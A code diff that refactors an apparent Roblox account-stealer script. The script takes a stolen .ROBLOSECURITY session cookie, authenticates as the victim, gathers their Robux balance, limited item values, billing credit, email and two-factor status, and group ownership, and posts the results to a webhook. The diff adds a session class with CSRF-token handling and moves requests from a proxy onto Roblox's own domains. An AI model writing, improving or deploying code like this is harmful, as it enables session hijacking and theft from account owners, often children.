@@ -5,6 +5,43 @@ import requests
 import re
 from datetime import datetime, timezone
 
+class RobloxSession:
+    def __init__(self, roblosecurity_cookie):
+        self.session = requests.Session()
+        # Ensure cookie is bound properly to the Roblox domain
+        self.session.cookies.set(".ROBLOSECURITY", roblosecurity_cookie, domain=".roblox.com")
+        self.session.headers.update({
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+            "Referer": "https://www.roblox.com/",
+            "Origin": "https://www.roblox.com/",
+            "Accept": "application/json, text/plain, */*"
+        })
+        self.csrf_token = None
+        self._refresh_csrf()
+
+    def _refresh_csrf(self):
+        try:
+            r = self.session.post("https://auth.roblox.com/v2/logout", timeout=10)
+            token = r.headers.get("x-csrf-token")
+            if token:
+                self.csrf_token = token
+                self.session.headers["X-CSRF-TOKEN"] = token
+        except Exception:
+            pass
+
+    def request(self, method, url, **kwargs):
+        resp = self.session.request(method, url, timeout=10, **kwargs)
+        if resp.status_code == 403 and "x-csrf-token" in resp.headers:
+            new_token = resp.headers["x-csrf-token"]
+            self.csrf_token = new_token
+            self.session.headers["X-CSRF-TOKEN"] = new_token
+            resp = self.session.request(method, url, timeout=10, **kwargs)
+        return resp
+
+    def whoami(self):
+        r = self.request("GET", "https://users.roblox.com/v1/users/authenticated")
+        return r
+
 def main():
     try:
         print("DEBUG: Python Extractor started", file=sys.stderr)
@@ -19,14 +56,12 @@ def main():
             sys.exit(1)
         
         raw_arg = sys.argv[1]
-        
         try:
             decoded_script = base64.b64decode(raw_arg).decode('utf-8', errors='ignore')
         except Exception:
             decoded_script = raw_arg
 
         roblosecurity = decoded_script.strip()
-        
         cookie_match = re.search(r'(_\\?\|WARNING:[^"\']+)', roblosecurity)
         if cookie_match:
             roblosecurity = cookie_match.group(1)
@@ -37,52 +72,38 @@ def main():
 
         print(f"DEBUG: Processed cookie length: {len(roblosecurity)}, Starts with: {roblosecurity[:15]}...", file=sys.stderr)
 
-        session = requests.Session()
-        session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roproxy.com")
-        
-        session.headers.update({
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-            "Accept": "application/json, text/plain, */*",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Referer": "https://www.roproxy.com/",
-            "Origin": "https://www.roproxy.com/"
-        })
+        # Initialize authenticated session client
+        client = RobloxSession(roblosecurity)
 
-        # --- STEP 1: Get X-CSRF-Token via RoProxy ---
-        try:
-            init_res = session.post("https://auth.roproxy.com/v1/logout", timeout=10)
-            csrf_token = init_res.headers.get("x-csrf-token")
-            if csrf_token:
-                session.headers.update({"X-CSRF-Token": csrf_token})
-        except Exception:
-            pass
-
-        # --- STEP 2: Fetch Authenticated User Session via RoProxy ---
-        auth_res = session.get("https://users.roproxy.com/v1/users/authenticated", timeout=10)
+        # Authenticated check
+        auth_res = client.whoami()
         print(f"DEBUG: Auth endpoint status code: {auth_res.status_code}", file=sys.stderr)
-        
+
         if auth_res.status_code != 200:
             print(f"DEBUG RESPONSE: {auth_res.text}", file=sys.stderr)
             sys.exit(1)
-            
+
         auth_data = auth_res.json()
         user_id = auth_data.get("id")
+        username = auth_data.get("name", "Unknown")
+        display_name = auth_data.get("displayName", username)
+
         if not user_id:
             sys.exit(1)
 
-        # --- Fetchers mapped to RoProxy domains ---
+        # --- Fetchers using the robust client session ---
         def get_user_info():
-            return session.get(f"https://users.roproxy.com/v1/users/{user_id}", timeout=10).json()
+            return client.request("GET", f"https://users.roblox.com/v1/users/{user_id}").json()
 
         def get_robux():
-            r = session.get(f"https://economy.roproxy.com/v1/users/{user_id}/currency", timeout=10).json()
+            r = client.request("GET", f"https://economy.roblox.com/v1/users/{user_id}/currency").json()
             return r.get("robux", 0)
 
         def get_pending():
-            r = session.get(
-                f"https://economy.roproxy.com/v2/users/{user_id}/transaction-totals",
-                params={"transactionType": "summary", "timeFrame": "Year"},
-                timeout=10
+            r = client.request(
+                "GET",
+                f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals",
+                params={"transactionType": "summary", "timeFrame": "Year"}
             ).json()
             return r.get("pendingRobuxTotal", 0)
 
@@ -93,10 +114,10 @@ def main():
                 params = {"limit": 100}
                 if cursor:
                     params["cursor"] = cursor
-                r = session.get(
-                    f"https://inventory.roproxy.com/v1/users/{user_id}/assets/collectibles",
-                    params=params,
-                    timeout=10
+                r = client.request(
+                    "GET",
+                    f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles",
+                    params=params
                 ).json()
                 for item in r.get("data", []):
                     limiteds.append(item.get("recentAveragePrice", 0))
@@ -106,37 +127,37 @@ def main():
             return limiteds
 
         def get_premium():
-            r = session.get(f"https://premiumfeatures.roproxy.com/v1/users/{user_id}/validate-membership", timeout=10)
+            r = client.request("GET", f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership")
             return r.json() == True
 
         def get_groups():
-            r = session.get(f"https://groups.roproxy.com/v1/users/{user_id}/groups/roles", timeout=10).json()
+            r = client.request("GET", f"https://groups.roblox.com/v1/users/{user_id}/groups/roles").json()
             groups = r.get("data", [])
             owned = sum(1 for g in groups if g.get("role", {}).get("rank") == 255)
             return len(groups), owned
 
         def get_games_developer():
-            r = session.get(f"https://develop.roproxy.com/v1/user/universes?userId={user_id}", timeout=10).json()
+            r = client.request("GET", f"https://develop.roblox.com/v1/user/universes?userId={user_id}").json()
             return len(r.get("data", [])) > 0
 
         def get_account_settings():
-            r = session.get("https://accountsettings.roproxy.com/v1/email", timeout=10).json()
+            r = client.request("GET", "https://accountsettings.roblox.com/v1/email").json()
             email_verified = r.get("verified", False)
-            r2 = session.get("https://twostepverification.roproxy.com/v1/metadata", timeout=10).json()
+            r2 = client.request("GET", "https://twostepverification.roblox.com/v1/metadata").json()
             twofa = r2.get("twoStepVerificationEnabled", False)
             return email_verified, twofa
 
         def get_credit():
-            r = session.get("https://billing.roproxy.com/v1/credit", timeout=10).json()
+            r = client.request("GET", "https://billing.roblox.com/v1/credit").json()
             return r.get("balance", 0), r.get("currencyType", "Unknown")
 
         def check_played(universe_id):
             cursor = ""
             while True:
-                r = session.get(
-                    f"https://badges.roproxy.com/v1/users/{user_id}/badges",
-                    params={"limit": 100, "cursor": cursor},
-                    timeout=10
+                r = client.request(
+                    "GET",
+                    f"https://badges.roblox.com/v1/users/{user_id}/badges",
+                    params={"limit": 100, "cursor": cursor}
                 ).json()
                 for badge in r.get("data", []):
                     if badge.get("awardingUniverse", {}).get("id") == universe_id:
@@ -147,8 +168,6 @@ def main():
 
         # --- Gather Data ---
         user        = get_user_info()
-        username    = user.get("name", "Unknown")
-        display_name = user.get("displayName", username)
         created     = user.get("created", "")
         age_days    = (datetime.now(timezone.utc) - datetime.fromisoformat(
                         created.replace("Z", "+00:00"))).days if created else 0
@@ -262,6 +281,7 @@ def main():
             }]
         }
 
+        # Dispatch to Cloudflare Worker webhook
         r = requests.post(webhook_url, json=payload, timeout=10)
         if r.status_code in (200, 204):
             print("DEBUG: Embed sent successfully!", file=sys.stderr)
